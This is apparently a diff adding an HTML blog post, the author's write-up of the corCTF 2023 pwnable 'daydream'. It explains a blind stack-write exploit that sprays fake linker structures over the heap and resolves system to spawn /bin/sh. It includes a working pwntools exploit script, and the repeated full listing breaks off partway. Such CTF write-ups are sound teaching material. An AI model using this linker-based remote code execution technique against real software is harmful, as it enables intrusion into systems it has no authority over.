@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" type="image/x-icon" sizes="any" href="/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css"
+      integrity="sha384-GvrOXuhMATgEsSwCs4smul74iXGOixntILdUW9XmUC6+HX0sLNAK3q71HotJqlAn"
+      crossorigin="anonymous"
+    />
+    
+		<link href="../_app/immutable/assets/0.f8f99493.css" rel="stylesheet">
+		<link href="../_app/immutable/assets/4.a584f254.css" rel="stylesheet">
+		<link href="../_app/immutable/assets/post.513bd049.css" rel="stylesheet">
+		<link rel="modulepreload" href="../_app/immutable/entry/start.a0c31b60.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/scheduler.b92a22d0.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/singletons.8268c95d.js">
+		<link rel="modulepreload" href="../_app/immutable/entry/app.5062054a.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/index.f9851652.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/0.274b8561.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/each.cebf2b70.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/stores.ada46f77.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/4.943259dd.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/post.9b990332.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/Seo.8f22d58a.js"><title>daydream: turning stack OOB into universal RCE without ever leaking memory</title><!-- HEAD_svelte-dqum1g_START --><meta name="description" content="author writeup to corCTF 2023's unsolved pwnable, where competitors must exploit a previously unexploitable primitive: universal blind stack write"><meta property="og:title" content="daydream: turning stack OOB into universal RCE without ever leaking memory"><meta property="og:description" content="author writeup to corCTF 2023's unsolved pwnable, where competitors must exploit a previously unexploitable primitive: universal blind stack write"><meta property="og:image" content="https://pepsipu.com/assets/images/me-af.png"><meta name="twitter:card" content="summary_large_image"><!-- HEAD_svelte-dqum1g_END -->
+  </head>
+
+  <body>
+    <div>  <header class="layout-md flex justify-between items-start mb-3 sm:mb-1" data-sveltekit-noscroll data-sveltekit-preload-code="eager"><h1 class="font-bold text-black text-2xl"><a href="/" data-svelte-h="svelte-pk3fzq">Sammy Hajhamid</a> </h1> <nav class="svelte-bgdsr9"><a href="https://pepsi.pw" class="hover:text-black transition-colors svelte-bgdsr9">??? </a><a href="/blog" class="hover:text-black transition-colors svelte-bgdsr9">blog </a></nav> </header> <main> <section class="layout-md py-12"><hr class="mb-5"> <div class="mb-1.5"><div class="text-2xl text-black sm:mb-1"><!-- HTML_TAG_START -->daydream: turning stack OOB into universal RCE without ever leaking memory<!-- HTML_TAG_END --></div> <div class="text-lg leading-snug font-light text-black sm:mb-1"><!-- HTML_TAG_START -->author writeup to corCTF 2023’s unsolved pwnable, where competitors must exploit a previously unexploitable primitive: universal blind stack write<!-- HTML_TAG_END --></div> <div class="flex justify-between items-start mb-3 sm:mb-1"><div class="text-sm text-neutral-400">August 5, 2023</div> <div class="text-sm text-neutral-400">security</div></div> <hr class="mb-6 mt-5"> <div class="md-output prose svelte-19wf98v"><!-- HTML_TAG_START --><h1>Introduction</h1>
+<p>I’ve always liked problems that were easy to state but hard to solve. The
+barrier for entry to corCTF pwn challenges are typically very high—µarch and
+kernel are large departures from the more comfortable heap notes, so “daydream”
+as was designed to be more accessible. This was not at the cost of difficulty.
+At the end of the CTF, it was one of the two pwn challenge to remain unsolved.</p>
+<p>“daydream” is a short glibc pwnable. In fact, here’s the source code for the
+challenge:</p>
+<pre class="hljs language-c"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">uint8_t</span> bytes[<span class="hljs-number">16</span>] = {<span class="hljs-number">0</span>};
+    <span class="hljs-type">size_t</span> idx, value = <span class="hljs-number">0</span>;
+
+    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>));
+
+    <span class="hljs-keyword">while</span> (!bytes[<span class="hljs-number">0</span>])
+    {
+        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ld %ld&quot;</span>, &amp;idx, &amp;value);
+        bytes[idx] = value;
+    }
+
+}
+</code></pre>
+<p>The description and name of the challenge hints at its relationship with
+“<a href="https://blog.pepsipu.com/posts/nightmare">nightmare</a>”, my challenge for
+DiceCTF 2022 (this writeup does not require understanding it, however it is
+strongly encouraged). This was a nudge and indicator that this is also a linker
+challenge.</p>
+<p>In short, the linker—also fancily called the runtime loader or dynamic linker to
+distinguish it from the compile-time linker—is the program that loads programs
+into memory. Typically, you’ll see this as some form of “ld-linux-x86-64.so.2”
+loaded as a shared library. All non-statically compiled programs use the linker,
+making it a near universal attack surface.</p>
+<p>A less subtle indicator for the linker, this challenge is also blind with all
+protections enabled. The executor for this challenge does not provide stdout, so
+all exploitation must occur without knowing any addresses in memory. Previously,
+there weren’t general strategies for blind-fullprot challenges (how does one
+encode executing a onegadget or system without specifying where either are
+located in memory?). Linker exploits can help with that! For example,
+<a href="https://hackmd.io/@v13td0x/ret2dlresolve">ret2dlresolve</a> is already a
+well-known and used trick.</p>
+<h1>First Steps</h1>
+<p>The program allows you to write whatever byte you want a relative offset from a
+stack buffer. Writing anything that’s not 0 to index 0 causes the program to
+return. It has all protections enabled, hides stdout, and has anti-bruteforce
+protection.</p>
+<p>First off, the only complex surface accessed before returning is “scanf”.
+However, it doesn’t use the values of anything we can write on the stack, so we
+cannot interfere with it. Similarly, returning from main doesn’t access stack
+variables. This means we must modify the return address. Because of the
+anti-bruteforce protection, we can only expect the bottom 12 bits to be
+constant. This means, as a first step, we can only modify the least significant
+byte, or LSB, of the return address for a consistent exploit.</p>
+<h1>LSB overwrite on <code>__libc_start_call_main+128</code></h1>
+<p>This is our return address.
+<img src="https://i.gyazo.com/5832fb920e16332979ba102e04372605.png" alt="the return address dawg">
+We can return anywhere in a 255 byte range by setting the last byte <code>90</code> to any
+value between <code>00</code> and <code>ff</code>. But where will we return? We can view all the
+options here: <img src="https://i.gyazo.com/85e2c3472ef0127323e9d793389a10ee.png" alt=""></p>
+<p>Well, what do we want out of the code that we’ll return to? It’ll <em>have</em> to
+reference data on the stack, since there’s simply not enough entropy in the
+registers we affect to encode “give me a shell”.</p>
+<p>Some attempts included jumping to <code>b2</code> since we control the syscall number, but
+we don’t have sufficient control over the other registers to any meaningful
+syscall besides <code>sigreturn</code>. However, even with <code>sigreturn</code>, we can’t construct
+a valid instruction pointer, so this avenue isn’t useful.</p>
+<p>Another, more fruitful attempt, is to rewind just a few bytes back in
+<code>__libc_start_call_main</code>, to <code>76</code>.
+<img src="https://i.gyazo.com/6b0abbb943f7cd5b38eef801e3fb77b0.png" alt=""></p>
+<p>Here, we load local variables off the stack and call <code>[rsp+8]</code>. This is the main
+function, and the arguments to it are the argument count, arguments, and the
+environment variables. These, except for the enviroment variables, are also held
+on the stack. Using <code>76</code> intuitively makes sense, because we know before calling
+<code>main</code> (where our return pointer is near) we need to load the function and its
+arguments, a process we can easily interfere with.</p>
+<h1>Neighbors of <code>main</code></h1>
+<p>We can modify <code>argc</code> and <code>argv</code> on the stack, as well as the pointer to <code>main</code>.
+We are in a similar situation now, able to call anything in a 255 byte range
+near <code>main</code> by modifying its LSB, but also with argument control. What should we
+call? Here are our options:
+<img src="https://i.gyazo.com/43e933100cc552c9caaed42b2b6ede1c.png" alt=""></p>
+<p>There are two interesting targets here: <code>scanf@plt</code>, and the PLT trampolines.</p>
+<p>Ideally, we could call <code>scanf</code> with arguments we control and get a format string
+exploit. However, since <code>argc</code> is 4 bytes, it can’t hold a pointer. Perhaps, in
+a different world, <code>argv</code> is the first argument to the main function, making
+this challenge trivial :P</p>
+<h2>PLT functions</h2>
+<p>I discuss PLT functions more in my writeup to
+<a href="https://blog.pepsipu.com/posts/nightmare">nightmare</a>, but the gist is that
+there are two code segments for each symbol: <code>.plt</code> functions and PLT
+trampolines. <code>.plt</code> functions are just jumps to whatever’s being held in the GOT
+entry associated with this symbol. This is what functions like <code>main</code> call into.
+For example, here’s the <code>.plt</code> function associated with <code>scanf</code>.</p>
+<p><img src="https://i.gyazo.com/02b93888c4ad443533106e66ddd51f94.png" alt=""></p>
+<p>PLT trampolines are the <strong>initial value of a symbol’s GOT entry</strong>, which calls a
+“resolver” function (such as <code>_dl_runtime_resolve_fxsave</code>) that overwrites the
+GOT entry with the actual address of the symbol in the library (such as <code>system</code>
+or <code>scanf</code>). They are typically structed as a push of the index associated with
+the symbol and jump to the resolver dispatcher. We won’t go into how these
+indicies are used right now. The resolver dispatcher just jumps to
+<code>_dl_runtime_resolve_fxsave</code>, which will take the index and translate it to an
+the actual function address. Here’s the PLT trampoline for <code>scanf</code>. We can see
+that the index associated with <code>scanf</code> is <code>0x3</code>:</p>
+<p><img src="https://i.gyazo.com/ea70af3e92921a2605be70e6497ee97b.png" alt=""></p>
+<p>And the dispatcher, at <code>020</code>:
+<img src="https://i.gyazo.com/b69f08a33b70f177744c2e5bff52fbd7.png" alt=""></p>
+<p>We can see in the GOT that most symbols are resolved, while <code>__stack_chk_fail</code>
+still points to its PLT trampoline. This makes sense, since the GOT entry hasn’t
+been overwritten by the resolver:
+<img src="https://i.gyazo.com/d09b2f32228382f41a44a6803c161da7.png" alt=""></p>
+<p>To summarize, <code>.plt</code> functions call whatever’s in the GOT. PLT trampolines put
+stuff in the GOT and call external symbols. They jump to the</p>
+<p>At this point, you might start brewing an interesting—but nearly
+impossible—plan. “If we could call the resolver dispatcher, at <code>20</code>, with our
+<em>own</em> index, <code>argc</code>, perhaps we could have our own symbol resolved, like
+<code>system</code>?”, many competitors thought.</p>
+<p>Moonshine! That can’t be possible. First off, the calling convention for the
+resolver dispatcher uses stack arguments, not registers. If we called the
+dispatcher, we’d end up pushing the return address of the call rather than the
+index we wanted to use. Besides, the indexes, like <code>scanf</code>’s <code>0x3</code>, are used to
+index tables, such as <code>symtab</code> or <code>strtab</code>, stored in the binary. Even if you
+could index those tables out-of-bounds, it wouldn’t matter, since you don’t
+control anything inside the binary. It’s just not possible.</p>
+<h1>Overlapping Stack Frames and Heap Sprays</h1>
+<p>First, we need to figure out how to jump to <code>20</code> rather than calling it. This is
+so we don’t push a return address on the stack, preventing us from specifying an
+arbitrary index.</p>
+<h2>Prologue Skipping</h2>
+<p>When calling a function, the epilogue assumes the size of the stack frame.
+Specifically, it assumes the stack has grown by the amount the prologue of the
+function has defined. In the case of the main function, the prologue looks like:</p>
+<p><img src="https://i.gyazo.com/c94c621edd4c89e0bb8bd30afd76418d.png" alt=""> The three pushes
+and <code>sub rsp, 0x30</code> cause the stack frame to be <code>0x48</code> bytes. The epilogue,
+similarily, does <code>add rsp, 0x30</code> and three pops:</p>
+<p><img src="https://i.gyazo.com/a70966f863123adf306e89e63f9a8ef3.png" alt=""></p>
+<p>However, if we called <code>main+16</code>, for example, skipping a few pushes in the
+prologue of the function, the epilogues assumptions on the stack frame’s size is
+invalidated. The prologue didn’t grow the stack frame as much as the epilogue
+assumes, causing the epilogue to eat in the previous functions stack frame. We
+can select the number of pushes we’d like to skip to overlap our stack frame
+with the previous one.</p>
+<p>In this case, we can skip two pushes to overlap the return address of <code>main</code>’s
+stack frame with the local variable, <code>main</code>, in <code>__libc_start_call_main</code>’s stack
+frame. This is the main function <code>__libc_start_call_main</code> calls. By tweaking the
+LSB of <code>main</code>, we can return into the PLT dispatcher! Writing the index we’d
+like to use under this return address allows us to emulate pushing it to the
+stack.</p>
+<h2><code>stdin</code> Spraying</h2>
+<p>Okay, that’s cool, but what’s the point if the index won’t point to our data?
+Well, if you’ve read
+<a href="https://jonathankeller.net/ctf/zelda/">this writeup on zelda</a> (or perhaps seem
+many <code>vmmap</code>s before), you’ll know that the heap is awfully close to the loaded
+binary. Sure enough, if you look at the
+<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c#L1031">kernel source</a>,
+the heap is a random offset from the end of the binary, in the range from
+<code>(0x0, 0x2000000)</code>.</p>
+<p>We do control data on the heap. <code>scanf</code> requests characters from the
+<code>_IO_2_1_stdin_</code> object, which reads bytes in chunks of in <code>0x2000</code>. One
+strategy we could try is creating a fake relocation object on the heap, and then
+guess the offset to index it. However, this requires bruteforce! What can we do?</p>
+<p>By repeatedly calling the <code>main</code> function in a loop, we can keep creating new
+backing buffers for <code>stdin</code>. We can fill all <code>0x2000</code> bytes, repeating our
+symbol object at intervals of <code>0x1000</code>. If we do this 4096 times, then we’d
+allocate <code>0x2000000</code> bytes of controlled data. If we then supply an index that’s
+<code>0x2000000</code> bytes off the end of the binary, we’re guaranteed to read the symbol
+either at the start of the heap, or the end of the heap. Spraying is a powerful
+technique that can often get around ASLR!</p>
+<p>To summarize what we’ve done so far, we’ve overwritten the LSB of the return
+address to rewind <code>__libc_start_call_main</code> so that it reads the address of
+<code>main</code> off the stack. It will continually call <code>main</code>, spraying the <code>stdin</code>
+input buffer over the heap. We then change the address of <code>main</code>’s LSB on the
+stack so it points to <code>main+16</code>. Then, when <code>main</code> returns, we call <code>main+16</code>.
+We change the return address, also <code>main+16</code>, to the resolver dispatcher. We
+also write the index of the maximum heap offset, <code>0x2000000</code>, under the return
+address. After <code>main+16</code> returns, it’ll jump to the dispatcher with the index at
+the top of the stack.</p>
+<h1>Symbol Resolution to RCE</h1>
+<p>Calling an arbitrary symbol isn’t enough to get remote code execution. Even if
+you can call <code>system</code>, what does it matter if you can’t control what <code>rdi</code>
+points to? We can’t call a one gadget since it’s not a well defined symbol, and
+even if we could, the constraints aren’t satisfied. If only it was possible to
+modify the register state somehow…</p>
+<h2>Modifying <code>_dl_runtime_resolve_xsavec</code>’s internal state</h2>
+<p>The underlying resolver called by the resolver dispatcher is a wrapper around
+the function <code>_dl_fixup</code>. It first stores all the registers interal state on the
+stack, calls <code>_dl_fixup</code> using the stack arguments, and then restores the
+register state. The idea behind it is that <code>_dl_fixup</code> is a foriegn function
+that may clobber the program state in unexpected ways, so we account for that by
+saving the state to the stack.</p>
+<p>By creating a symbol which calls into <code>main</code> (again) using a <code>STT_GNU_IFUNC</code>, we
+can not only modify the local variables of <code>_dl_fixup</code>, but also register state
+stored by <code>_dl_runtime_resolve_xsavec</code>. Specifically, with an LSB overwrite, we
+can cause the resolved symbol, <code>_dl_fixup</code>’s return value, to be the resolver
+dispatcher, allowing us to call <code>_dl_fixup</code> on the next index on the stack. This
+is useful, because we can modify the register state with our stack write before
+calling into the dispatcher.</p>
+<h2>Stack Spraying “/bin/sh”</h2>
+<p>Specifically, we’d like to get <code>rdi</code> pointing at “/bin/sh”. <code>rdi</code> is set to a
+stack buffer used by <code>scanf</code> for storing the last read value. We can modify the
+saved <code>rdi</code> in <code>_dl_runtime_resolve_xsavec</code>, setting its last two bytes to <code>00</code>.
+The overall effect is that <code>rdi</code> points much higher on the stack, safe from
+getting clobbered by <code>_dl_fixup</code> when we call <code>system</code>. We can then spray
+<code>0x10000 / 8</code> &quot;/bin/sh&quot;s over the stack, and we’ll be guarenteed to have <code>rdi</code>
+point to them once <code>_dl_runtime_resolve_xsavec</code> restores it. From there, we just
+choose a different symbol index that’ll resolve <code>system</code>.</p>
+<h1>Exploit Code</h1>
+<p>Let’s put this into action, calling a symbol we desire. I’m skipping over a few
+implementation details (Technically the allocation size is <code>0x2010</code>, since the
+chunk header occupies <code>0x10</code> bytes. This means we need to shift around our spray
+inside the input buffer to stay aligned to <code>0x1000</code> byte boundaries.
+Additionally, because we have to have valid indicies for tables of different
+sizes, we need to have larger sprays. For example, if we index a table with
+1-byte-sized elements at index <code>0x2000000</code>, indexing a table with 2-byte-sized
+elements would be at the logical byte offset <code>0x2000000 * 2</code>, or <code>0x4000000</code>).</p>
+<p>First, I’ll create a wrapper for the payload creation. It’ll make creating
+sprays easier.</p>
+<pre class="hljs language-python"><code><span class="hljs-keyword">class</span> <span class="hljs-title class_">Buffer</span>(io.BytesIO):
+    <span class="hljs-comment"># fills the rest of the stdin buffer</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">commit</span>(<span class="hljs-params">self</span>):
+        self.write(<span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">0x2000</span> - (self.tell() % <span class="hljs-number">0x2000</span>)))
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">swrite</span>(<span class="hljs-params">self, where, what</span>):
+        self.write(<span class="hljs-string">f&quot;<span class="hljs-subst">{where}</span> <span class="hljs-subst">{what}</span>&quot;</span>.encode() + <span class="hljs-string">b&quot;\n&quot;</span>)
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_bytes</span>(<span class="hljs-params">self, where, what</span>):
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(what)):
+            self.swrite(where + i, what[i])
+buf = Buffer()
+</code></pre>
+<p>Then, I’ll define some constants for the location of the return address,
+<code>__libc_start_call_main+128</code>, and the local variable <code>main</code> in
+<code>__libc_start_call_main</code>.</p>
+<pre class="hljs language-python"><code>ret_addr = <span class="hljs-number">0x38</span>
+main_addr = ret_addr + <span class="hljs-number">0x10</span>
+</code></pre>
+<p>Now, I’ll calculate the required indices for each table:</p>
+<pre class="hljs language-python"><code>maximum_heap_offset = <span class="hljs-number">0x2000000</span>
+
+payload_offset = (
+    maximum_heap_offset + <span class="hljs-number">0x5000</span> + <span class="hljs-number">0xBA8</span>
+)  <span class="hljs-comment"># offset from start of binary space</span>
+<span class="hljs-keyword">assert</span> (payload_offset - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_JMPREL&quot;</span>)) % <span class="hljs-number">0x18</span> == <span class="hljs-number">0</span>
+
+plt_idx = (
+    payload_offset - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_JMPREL&quot;</span>)
+) // <span class="hljs-number">0x18</span>  <span class="hljs-comment"># offset from start of binary space</span>
+symtab_idx = (
+    payload_offset + <span class="hljs-number">0x18</span> - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_SYMTAB&quot;</span>)
+) // <span class="hljs-number">0x18</span>  <span class="hljs-comment"># offset from start of binary space</span>
+ver_idx = (payload_offset + <span class="hljs-number">0x18</span> - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_VERSYM&quot;</span>)) // <span class="hljs-number">0x2</span>
+
+
+strtab_idx = (
+    payload_offset + <span class="hljs-number">0x18</span> * <span class="hljs-number">2</span> + <span class="hljs-number">0x8</span> - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_STRTAB&quot;</span>)
+)  <span class="hljs-comment"># offset from start of binary space</span>
+</code></pre>
+<p>We’ll then actually create the symbol structures, into a simple sprayable
+<code>payload</code>.</p>
+<pre class="hljs language-python"><code>fake_symtab_entry = (
+    p32(<span class="hljs-number">0x17</span>) + p8(<span class="hljs-number">10</span>) + p8(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">bin</span>.symbols[<span class="hljs-string">&quot;main&quot;</span>]) + p64(<span class="hljs-number">0</span>)
+) + (p32(strtab_idx) + p8(<span class="hljs-number">10</span>) + p8(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xDEADBEEF</span>) + p64(<span class="hljs-number">0</span>))
+fake_reloc_entry = (p64(<span class="hljs-number">0x4018</span>) + p32(<span class="hljs-number">7</span>) + p32(ver_idx) + p64(<span class="hljs-number">0</span>)) + (
+    p64(<span class="hljs-number">0x4018</span>) + p32(<span class="hljs-number">7</span>) + p32(ver_idx + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)
+)
+fake_vertab_entry = p64(<span class="hljs-number">0x03</span>) + <span class="hljs-string">b&quot;system\x00&quot;</span>
+payload = fake_reloc_entry + fake_vertab_entry
+</code></pre>
+<p>We’ll then actually spray this payload over the heap, at intervals of <code>0x1000</code>.</p>
+<pre class="hljs language-python"><code><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(maximum_heap_offset // <span class="hljs-number">0x2000</span> * <span class="hljs-number">0xC</span>):
+    <span class="hljs-comment"># write payload at offsets</span>
+    symtab_offset = <span class="hljs-number">0x908</span> + <span class="hljs-number">0xF0</span>
+    reloc_symtab_offset = <span class="hljs-number">0x908</span>
+    <span class="hljs-comment"># create series of writes and the indexes they need to be written at</span>
+    payload_offsets = <span class="hljs-built_in">sorted</span>(
+        [
+            ((reloc_symtab_offset - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, payload),
+            ((reloc_symtab_offset + <span class="hljs-number">0x1000</span> - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, payload),
+            ((symtab_offset - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, fake_symtab_entry),
+            ((symtab_offset + <span class="hljs-number">0x1000</span> - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, fake_symtab_entry),
+        ],
+        key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>],
+    )
+
+    spray_buf = Buffer()
+    spray_buf.truncate(<span class="hljs-number">0x2000</span>)
+    <span class="hljs-keyword">for</span> offset, dat <span class="hljs-keyword">in</span> payload_offsets:
+        <span class="hljs-keyword">if</span> offset &gt; <span class="hljs-number">0x2000</span> - <span class="hljs-built_in">len</span>(dat):
+            <span class="hljs-keyword">continue</span>
+        spray_buf.seek(offset)
+        spray_buf.write(dat)
+
+    spray_buf.seek(<span class="hljs-number">0</span>)
+
+    spray_buf.swrite(ret_addr, <span class="hljs-number">0x76</span>) <span class="hljs-comment"># recall main on ret</span>
+    spray_buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>)
+    buf.write(spray_buf.getvalue())
+    buf.commit()
+</code></pre>
+<p>Now that we’ve sprayed our symbol data over the heap, we call overlap the stack
+frames of <code>main</code> and <code>__libc_start_call_main</code>:</p>
+<pre class="hljs language-python"><code><span class="hljs-comment"># set lsb to main+0x10 to misalign the stack by 0x10 bytes</span>
+buf.swrite(main_addr, <span class="hljs-number">0xD0</span>)
+<span class="hljs-comment"># set lsb of __libc_start_call_main to recall main+0x10</span>
+buf.swrite(ret_addr, <span class="hljs-number">0x76</span>)
+<span class="hljs-comment"># set edi to large malloc (local variable argc by __libc_start_call_main)</span>
+buf.write_bytes(main_addr + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x4</span>, p32(<span class="hljs-number">0x2000</span>))
+
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>)
+buf.commit()
+</code></pre>
+<p>After we’ve returned from <code>main</code>, we’ll modify the return address of <code>main+16</code>
+to point to the resolver dispatcher.</p>
+<pre class="hljs language-python"><code><span class="hljs-comment"># reset</span>
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+<span class="hljs-comment"># plt resolver addr</span>
+buf.swrite(ret_addr, <span class="hljs-number">0x20</span>)
+<span class="hljs-comment"># set plt index, which should be on the heap. this&#x27;ll call main</span>
+buf.write_bytes(ret_addr + <span class="hljs-number">0x8</span>, p64(plt_idx))
+<span class="hljs-comment"># this&#x27;ll also call main. it&#x27;s for stack alignment.</span>
+buf.write_bytes(ret_addr + <span class="hljs-number">0x10</span>, p64(plt_idx))
+<span class="hljs-comment"># this&#x27;ll call system.</span>
+buf.write_bytes(ret_addr + <span class="hljs-number">0x18</span>, p64(plt_idx + <span class="hljs-number">1</span>))
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>)
+
+buf.commit()
+</code></pre>
+<p>Now, once we’re in the main invoked within <code>_dl_fixup</code>, we’ll modify internal
+state of <code>_dl_fixup</code> and <code>_dl_runtime_resolve_xsavec</code>.</p>
+<pre class="hljs language-python"><code><span class="hljs-comment"># hop _dl_fixup to alternate branch that uses stack variable for return value</span>
+buf.swrite(ret_addr, <span class="hljs-number">0xA4</span>)
+<span class="hljs-comment"># set lsb of return value of _dl_fixup to dispatch resolver</span>
+buf.swrite(ret_addr + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>)
+
+<span class="hljs-comment"># set saved rdi bottom two bytes to 0000</span>
+buf.write_bytes(<span class="hljs-number">0xA0</span>, p16(<span class="hljs-number">0x0000</span>))
+
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
+buf.commit()
+</code></pre>
+<p>We’ll spray “/bin/sh” over where <code>rdi</code> points in the next iteration of <code>main</code>.</p>
+<pre class="hljs language-python"><code>
+spray = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> * <span class="hljs-number">0x2000</span>
+buf.write_bytes(-<span class="hljs-number">0x10000</span>, spray)
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
+buf.commit()
+
+</code></pre>
+<p>Now, the next input proccessed will be by <code>/bin/sh</code>! Let’s get the flag and win.</p>
+<pre class="hljs language-python"><code>buf.write(<span class="hljs-string">b&quot;cat /flag\nexit\n&quot;</span>)
+</code></pre>
+<p>Here’s the exploit in its entirety.</p>
+<pre class="hljs language-python"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> io
+
+<span class="hljs-built_in">bin</span> = ELF(<span class="hljs-string">&quot;./daydream&quot;</span>)
+<span class="hljs-comment"># r = process(bin.path)</span>
+
+<span class="hljs-comment"># r = remote(&quot;localhost&quot;, 5000)</span>
+<span class="hljs-comment"># r = process([&quot;python3&quot;, &quot;main.py&quot;])</span>
+<span class="hljs-comment"># gdb.attach(r, &quot;break *_dl_fixup+81\nbreak *main+152&quot;)</span>
+<span class="hljs-comment"># gdb.attach(r, &quot;break *_dl_fixup+608\nbreak *_dl_runtime_resolve_xsavec+186&quot;)</span>
+
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">Buffer</span>(io.BytesIO):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">commit</span>(<span class="hljs-params">self</span>):
+        self.write(<span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">0x2000</span> - (self.tell() % <span class="hljs-number">0x2000</span>)))
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">swrite</span>(<span class="hljs-params">self, where, what</span>):
+        self.write(<span class="hljs-string">f&quot;<span class="hljs-subst">{where}</span> <span class="hljs-subst">{what}</span>&quot;</span>.encode() + <span class="hljs-string">b&quot;\n&quot;</span>)
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_bytes</span>(<span class="hljs-params">self, where, what</span>):
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(what)):
+            self.swrite(where + i, what[i])
+
+
+buf = Buffer()
+
+ret_addr = <span class="hljs-number">0x38</span>
+main_addr = ret_addr + <span class="hljs-number">0x10</span>
+maximum_heap_offset = <span class="hljs-number">0x2000000</span>
+
+payload_offset = (
+    maximum_heap_offset + <span class="hljs-number">0x5000</span> + <span class="hljs-number">0xBA8</span>
+)  <span class="hljs-comment"># offset from start of binary space</span>
+<span class="hljs-keyword">assert</span> (payload_offset - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_JMPREL&quot;</span>)) % <span class="hljs-number">0x18</span> == <span class="hljs-number">0</span>
+
+plt_idx = (
+    payload_offset - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_JMPREL&quot;</span>)
+) // <span class="hljs-number">0x18</span>  <span class="hljs-comment"># offset from start of binary space</span>
+symtab_idx = (
+    payload_offset + <span class="hljs-number">0x18</span> - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_SYMTAB&quot;</span>)
+) // <span class="hljs-number">0x18</span>  <span class="hljs-comment"># offset from start of binary space</span>
+ver_idx = (payload_offset + <span class="hljs-number">0x18</span> - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_VERSYM&quot;</span>)) // <span class="hljs-number">0x2</span>
+
+
+strtab_idx = (
+    payload_offset + <span class="hljs-number">0x18</span> * <span class="hljs-number">2</span> + <span class="hljs-number">0x8</span> - <span class="hljs-built_in">bin</span>.dynamic_value_by_tag(<span class="hljs-string">&quot;DT_STRTAB&quot;</span>)
+)  <span class="hljs-comment"># offset from start of binary space</span>
+
+
+fake_symtab_entry = (
+    p32(<span class="hljs-number">0x17</span>) + p8(<span class="hljs-number">10</span>) + p8(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">bin</span>.symbols[<span class="hljs-string">&quot;main&quot;</span>]) + p64(<span class="hljs-number">0</span>)
+) + (p32(strtab_idx) + p8(<span class="hljs-number">10</span>) + p8(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xDEADBEEF</span>) + p64(<span class="hljs-number">0</span>))
